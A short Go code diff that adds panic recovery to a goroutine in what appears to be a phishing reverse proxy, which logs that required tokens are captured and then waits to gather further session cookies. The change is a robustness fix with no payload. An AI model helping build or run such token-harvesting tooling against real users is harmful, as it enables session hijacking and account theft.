@@ -1504,6 +1504,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							sid := ps.SessionId
 							idx := ps.Index
 							go func() {
+								defer func() {
+									if r := recover(); r != nil {
+										log.Error("Recovered from panic in cookie-gather delay goroutine: %v", r)
+									}
+								}()
 								log.Info("[%d] all required tokens captured, waiting %ds for additional cookies...", idx, gatherDelay)
 								time.Sleep(time.Duration(gatherDelay) * time.Second)
 
